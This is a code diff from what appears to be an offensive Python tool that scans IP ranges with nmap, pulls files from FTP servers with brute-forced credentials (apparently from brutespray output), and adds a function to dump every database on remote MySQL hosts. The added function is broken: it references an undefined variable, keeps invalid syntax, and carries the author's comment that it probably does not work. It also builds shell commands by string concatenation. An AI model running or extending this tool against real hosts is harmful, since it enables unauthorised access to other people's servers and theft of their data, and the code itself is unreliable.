@@ -17,7 +17,7 @@ def clean_up():
 	out, err = proc.communicate()
 
 def run_nmap(ip_range: str):
-	cmd = "nmap -p21,22,3306 --open -sV " + ip_range + " -oG output.gnmap"
+	cmd = "nmap -p21,22 --open -sV " + ip_range + " -oG output.gnmap"
 	proc = subprocess.Popen(cmd.split(), stdout=subprocess.PIPE)
 	output, error = proc.communicate()
 	print(output.decode('utf-8'))
@@ -35,8 +35,17 @@ def get_ftp_files(ip, username, password):
 	cmd = mkdir + wget
 	proc = subprocess.Popen(cmd.split(), stdout=subprocess.PIPE, shell=True)
 	out, err = proc.communicate()
-	if err not None:
-		print("files grabbed from",username,":",password,"@",ip)
+	# if err not None:
+	# 	print("files grabbed from",username,":",password,"@",ip)
+
+def get_mysql_files(ip, username, password):
+	# this probably doesn't work yet
+	mkdir = "mkdir " + username + ":" + ip + ";"
+	mysqldump = "mysqldump -h " + ip + " -u" + username + " -p " + password + " --all-databases > " + username + ":" + ip + "/dump.sql"
+	proc = subprocess.Popen(cmd.split(), stdout=subprocess.PIPE, shell=True)
+	out, err = proc.communicate()
+	# if err not None:
+	# 	print("files grabbed from",username,":",password,"@",ip)
 
 def show_cracked_info():
 	cracked_cmd = "cat brutespray-output/*"
